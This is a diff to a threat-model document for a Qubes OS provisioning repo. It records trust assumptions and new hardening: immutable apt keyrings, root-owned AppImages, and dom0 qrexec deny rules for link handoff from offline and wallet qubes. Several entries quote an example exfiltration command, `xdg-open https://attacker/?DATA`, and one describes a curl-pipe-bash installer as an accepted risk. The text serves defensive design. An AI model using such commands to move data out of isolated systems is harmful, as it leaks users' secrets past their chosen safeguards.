@@ -9,7 +9,7 @@ boundaries — copying code into dom0, installing software into templates, wirin
 qubes together — so every crossing is a place where trust is extended. The point
 of this file is to make each assumption explicit and reviewable.
 
-State as of **2026-05-21**. (Per-component key-fingerprint verification dates remain as captured inside each entry; this top-line date tracks the document itself.)
+State as of **2026-05-22**. (Per-component key-fingerprint verification dates remain as captured inside each entry; this top-line date tracks the document itself.)
 
 ## Re-verifying these claims yourself
 
@@ -67,7 +67,7 @@ Trusted unconditionally — nothing in this repo can compensate if these are com
 ### The dom0 "cat hack" copy
 - **Trust assumption:** `qvm-run -p REPO_VM cat <file>` returns the genuine file.
 - **Established by:** ❌ Nothing — a raw byte copy with no integrity check. This is the documented Qubes way to move files into dom0, and is exactly why review must happen *before* running anything.
-- **Residual risk:** No tamper detection between `REPO_VM` and dom0; mitigated only by manual review and by `REPO_VM` being trusted.
+- **Residual risk:** No tamper detection between `REPO_VM` and dom0; mitigated only by manual review and by `REPO_VM` being trusted. The README one-liner now appends `2>/dev/null` to the bootstrap `qvm-run` so a compromised `REPO_VM` cannot emit ANSI / CSI / OSC sequences to dom0's terminal during the fetch — `vmRun`'s sanitizer doesn't yet exist at this stage, so stderr would otherwise reach the terminal raw.
 
 ### `setup-qubes.sh` (runs in dom0)
 - **Trust assumption:** Orchestrates qube creation/templating correctly and runs only the intended install scripts.
@@ -98,6 +98,9 @@ Trusted unconditionally — nothing in this repo can compensate if these are com
 
 ## 3. Software sources
 
+### apt-repo trust anchors: `chattr +i` on every embedded-key keyring
+Each apt-repo component below (Brave, Signal, Element, Docker, VS Code) drops its verified signing key at a known path under `/usr/share/keyrings/` or `/etc/apt/keyrings/` and references that path from `signed-by=` in `/etc/apt/sources.list.d/…`. After the install completes, the script runs `sudo chattr +i` on the keyring file. The Pin-Priority: -1 + named-package allowlist (Brave excludes `brave-keyring` for this reason; the others bound the package set to the app itself) gates which packages this repo can ship. `chattr +i` is the additional layer: a root-running maintainer script inside an allowlisted package that did `cp /usr/share/<app>/something.gpg ${keyring}` would silently rotate the trust anchor the `signed-by=` directive references — with no SEQS verification ever firing again. Immutability turns that into a loud dpkg failure, forcing legitimate key rotation through manual `sudo chattr -i ${keyring}` + re-verify of the new fingerprint against the same three independent sources documented per-component below.
+
 ### Brave — apt repository & signing keys ✅
 - **Trust assumption:** Brave's apt signing keys are genuine; thereafter apt trusts whatever Brave signs.
 - **Established by:** ✅ `lib/brave.sh` downloads the keyring and **aborts unless it contains exactly the three pinned key fingerprints**:
@@ -119,7 +122,7 @@ Trusted unconditionally — nothing in this repo can compensate if these are com
 
 ### KeePassXC — AppImage with verified signature ✅
 - **Trust assumption:** The KeePassXC AppImage really was built and released by the KeePassXC team.
-- **Established by:** ✅ `install-scripts/components/keepass/template-vm.sh` embeds the KeePassXC release signing key, downloads the release's detached `.sig`, and **aborts unless `gpg --verify` confirms the AppImage is signed by that key** (primary fingerprint `BF5A669F2272CF4324C1FDA8CFB4C2166397D0D2`). The fingerprint was verified on **2026-05-18** against `keepassxc.org/verifying-signatures/`, a keys.openpgp.org by-fingerprint lookup, and the Arch Linux `keepassxc` PKGBUILD — see the script header. After the gpg check, the script also binds the verified bytes against in-place tamper before install: hash the AppImage, `chmod 0400`, re-hash immediately before `sudo install -m 0755 … /usr/bin/keepassxc.AppImage` and abort on drift (same pattern as BitBox/OpenOffice).
+- **Established by:** ✅ `install-scripts/components/keepass/template-vm.sh` embeds the KeePassXC release signing key, downloads the release's detached `.sig`, and **aborts unless `gpg --verify` confirms the AppImage is signed by that key** (primary fingerprint `BF5A669F2272CF4324C1FDA8CFB4C2166397D0D2`). The fingerprint was verified on **2026-05-18** against `keepassxc.org/verifying-signatures/`, a keys.openpgp.org by-fingerprint lookup, and the Arch Linux `keepassxc` PKGBUILD — see the script header. After the gpg check, the script also binds the verified bytes against in-place tamper before install: hash the AppImage, `chmod 0400`, re-hash immediately before `sudo install -m 0755 … /usr/bin/keepassxc.AppImage` and abort on drift (same pattern as BitBox/OpenOffice). The keepass qube spec carries the `offline` flag, which implies `no-handoff` — `setupBrowserSuppressionPolicy` writes a dom0 deny for `qubes.OpenURL` from `A-keepass`, and `installQube` skips wiring the per-qube xdg-open handler. Without that pair, any code that ever runs in the air-gapped vault could ferry data out via `xdg-open https://attacker/?DATA` driven through the qrexec OpenURL handoff (which is unaffected by `netvm=none`). The per-component `menu.desktop` launcher (the only one in the repo) is now installed root-owned mode 0644 via `install -m 0644 -o root -g root` instead of `sudo mv` — `mv` is a same-fs rename and preserves the source file's user:user ownership, which previously left `/usr/share/applications/keepass.desktop` writable by the qube user account so anything running as `user` in `A-keepass` could rewrite the `Exec=` line and divert the next menu click to attacker code against the unlocked vault.
 - **Residual risk:** The version (currently 2.7.12) is pinned in the script; an AppImage does not auto-update, so security fixes arrive only when the pin is bumped and the script re-run. The signing key is embedded in the repo, so it also inherits §2 repo trust.
 
 ### Signal — apt repository with an embedded, verified key ✅
@@ -158,10 +161,10 @@ Trusted unconditionally — nothing in this repo can compensate if these are com
 - **Residual risk:** The pinned version (currently 4.1.16) is bumped manually; Apache OpenOffice releases infrequently.
 
 ### Ledger Live ❌ — unverifiable
-- **Component:** `install-scripts/components/ledger/app-vm.sh` — `curl -fsSL https://download.live.ledger.com/latest/linux`.
+- **Component:** `install-scripts/components/ledger/template-vm.sh` — `curl --proxy 127.0.0.1:8082 -fsSL https://download.live.ledger.com/latest/linux` followed by `sudo install -m 0755 -o root -g root TMP /usr/bin/LedgerLive.AppImage`. The download moved from the app-vm phase to the template phase so the final artifact lands root-owned at `/usr/bin/` rather than user-owned at `~/`.
 - **Trust assumption:** The AppImage served by Ledger at that URL is genuine.
 - **Established by:** ❌ Nothing. Ledger does **not** publish a GPG signature for the Linux AppImage (only a SHA-512 on a JS-rendered download page), and the download URL is unversioned ("latest"), so the AppImage can be neither signature-verified nor version-pinned. `-f` is set so an HTTP error page is not saved as the AppImage, but the AppImage content itself is trusted on download.
-- **Residual risk:** Whoever controls Ledger's download infrastructure or DNS can serve arbitrary code into the wallet qube. The Ledger udev rules in `install-scripts/components/ledger/template-vm.sh` are independent — the hardware device works regardless.
+- **Residual risk:** Whoever controls Ledger's download infrastructure or DNS can serve arbitrary code into the wallet qube AT INSTALL TIME. Post-install, the AppImage is root-owned at `/usr/bin/LedgerLive.AppImage` (matching the keepass pattern), so a later compromise of the qube user account cannot silently swap the binary between sessions — the previous app-vm-phase layout left `~/LedgerLive.AppImage` user-writable, turning a one-time-clean install into a one-time-good-until-first-user-account-RCE install. The Ledger udev rules in the same `template-vm.sh` are independent — the hardware device works regardless.
 
 ### pyenv (python component) ❌ — accepted tradeoff
 - **Component:** `install-scripts/components/python/app-vm.sh` — `curl -fsSL https://pyenv.run | bash`.
@@ -192,10 +195,10 @@ Trusted unconditionally — nothing in this repo can compensate if these are com
 ## 4. Runtime & inter-qube wiring
 
 ### Browser-link policy (`qubes.OpenURL` → `A-brave`)
-- **Component:** `setup-qubes.sh` writes `/etc/qubes/policy.d/29-browser.policy` and a `.desktop` handler so every app qube opens web links in `A-brave`.
-- **Trust assumption:** `A-brave` can safely handle arbitrary, possibly hostile URLs handed to it by any qube.
+- **Component:** `setup-qubes.sh` writes `/etc/qubes/policy.d/29-browser.policy` (the catch-all `@anyvm → A-brave allow`) AND `/etc/qubes/policy.d/28-browser-suppress.policy` (deny rules for every qube spec carrying `offline` or `no-handoff`, written by `setupBrowserSuppressionPolicy`). The 28- file is evaluated before the 29- file (qrexec first-match-wins), so the deny fires before the catch-all allow for opted-out qubes. The per-qube xdg launcher (`/usr/share/applications/<…>`) is also skipped for those qubes by `installQube`.
+- **Trust assumption:** `A-brave` can safely handle arbitrary, possibly hostile URLs handed to it by any qube that *is* allowed to drive the handoff.
 - **Established by:** A deliberate design choice — concentrating link handling in one browser qube *is* the isolation benefit.
-- **Residual risk:** `A-brave` becomes a funnel for hostile links from every qube; its compromise is in scope. The policy allows `@anyvm → A-brave`. Specifically, the policy verb is `allow`, **not `ask`** — any code running in any qube can silently drive `A-brave` to navigate to a chosen URL with no dom0 prompt. A compromised qube can use this to exfiltrate via DNS-in-URL, push the user at a phishing page in `A-brave`, or chain a browser 0-day. `ask` would catch the unexpected programmatic case while leaving normal user-clicked links smooth. Deferred — accepting the silent passthrough for ergonomic handoff.
+- **Residual risk:** For qubes WITHOUT `offline` / `no-handoff`, `A-brave` is a funnel for hostile links from every qube; its compromise is in scope. The policy verb is `allow`, **not `ask`** — any code running in those qubes can silently drive `A-brave` to navigate to a chosen URL with no dom0 prompt. A compromised qube can use this to exfiltrate via DNS-in-URL, push the user at a phishing page in `A-brave`, or chain a browser 0-day. `ask` would catch the unexpected programmatic case while leaving normal user-clicked links smooth. Deferred — accepting the silent passthrough for ergonomic handoff. For qubes WITH `offline` / `no-handoff` (default: `keepass`, `wallet-ledger`, `wallet-trezor`), this channel is closed at both the dom0 qrexec boundary and the per-qube xdg config — a compromise of the qube user account cannot re-enable it from inside the qube (the dom0 file is root-owned and the 28- precedes 29- regardless of qube-side xdg state). `offline` implies `no-handoff` because an offline qube with the handoff wired could still drive `A-brave` via `qvm-open-in-vm` (qrexec is unaffected by `netvm=none`) to exfiltrate via `xdg-open https://attacker/?DATA`, silently defeating the air-gap the operator chose `offline` for.
 
 ### USB-keyboard policy override (`qubes.InputKeyboard` from `sys-usb` → dom0) ⚠️
 - **Component:** `setup-qubes.sh`'s `setupUsbKeyboardPolicy` writes `/etc/qubes/policy.d/30-user-input.policy` (Qubes 4.3 only, only when `sys-usb` exists) containing:
@@ -250,13 +253,17 @@ Trusted unconditionally — nothing in this repo can compensate if these are com
 
   Deferred — accepted as a default because RPC endpoint sets are operator-specific. The recommended hardening when you know your endpoints is a per-qube `qvm-firewall` default-deny + explicit allow-list, written from dom0 against the live IP set (typical: your RPC provider's hostnames, `clients2.google.com` for extension auto-update if you keep that channel, and any block-explorer you actually use). The cost is breakage every time an endpoint rotates; the benefit is that the extension no longer faces an open door if it ever turns.
 
+  **One layer is no longer deferred:** the default `WALLET_QUBES` specs now carry the `no-handoff` flag, which writes a dom0 qrexec deny rule (28-browser-suppress.policy) for `qubes.OpenURL` from each wallet qube to any target AND skips wiring the per-qube xdg `xdg-open → A-brave` handler. Without this, a compromised wallet extension could ferry data out via `xdg-open https://attacker/?DATA` routed through the open handoff policy — bypassing any `qvm-firewall` lockdown the operator later adds (qvm-firewall does not gate qrexec). The handoff back-channel is now closed by default for wallet qubes; the qvm-firewall lockdown above remains the operator's job for the rest of the egress surface.
+
 ---
 
 ## Weakest links, ranked
 
 1. **USB-keyboard policy override** (§4) — weakens the Qubes 4.3 default `deny` on `qubes.InputKeyboard sys-usb → dom0` to `ask default_target=@adminvm`. A BadUSB-class device that enumerates as a HID keyboard yields keystroke injection into dom0 = total compromise if the operator reflexively accepts the attach prompt. Accepted in exchange for external USB keyboards working without per-boot `qvm-input-keyboard` ceremony.
-2. **Ledger Live** (§3) — Ledger publishes no verifiable artifact for the Linux AppImage and the URL is unversioned, so it can be neither signature-verified nor version-pinned. The one remaining unverifiable software download.
+2. **Ledger Live** (§3) — Ledger publishes no verifiable artifact for the Linux AppImage and the URL is unversioned, so it can be neither signature-verified nor version-pinned at install time. The post-install replaceability hole is now closed (root-owned `/usr/bin/LedgerLive.AppImage`), but the one-shot install-time trust remains the residual.
 3. **curl-pipe-bash installers** (§3) — the `python` (pyenv), `node` (nvm) and `claude-code` components execute unreviewed remote code on install. For pyenv and nvm this is a deliberate tradeoff for dev-version flexibility; see their entries.
-4. **`REPO_VM` + cat hack** (§2) — the repo and its host qube are dom0-equivalent in effect; protected only by manual review.
+4. **`REPO_VM` + cat hack** (§2) — the repo and its host qube are dom0-equivalent in effect; protected only by manual review. Bootstrap stderr is now suppressed at the README's one-liner so a hostile `REPO_VM` cannot emit terminal escapes during the fetch; the underlying "REPO_VM = dom0" envelope is unchanged.
 
-Brave, KeePassXC, Signal, Docker, VS Code, BitBoxApp, Apache OpenOffice and Element (§3) verify their signing keys/signatures against pinned, cross-checked fingerprints; only Ledger Live remains unverifiable.
+Brave, KeePassXC, Signal, Docker, VS Code, BitBoxApp, Apache OpenOffice and Element (§3) verify their signing keys/signatures against pinned, cross-checked fingerprints, and the keyrings are then `chattr +i`'d so a maintainer-script rewrite of the trust anchor inside an allowlisted package would fail loudly instead of silently rotating; only Ledger Live remains unverifiable.
+
+The browser-link handoff back-channel that previously undermined every `offline` qube and the wallet qubes is now closed by default: `setupBrowserSuppressionPolicy` writes a dom0 deny for `qubes.OpenURL` from every qube spec carrying `offline` or `no-handoff`, and the per-qube xdg launcher is skipped for those qubes. `offline` implies `no-handoff`. The default `WALLET_QUBES` carry `no-handoff` and the keepass qube carries `offline`.
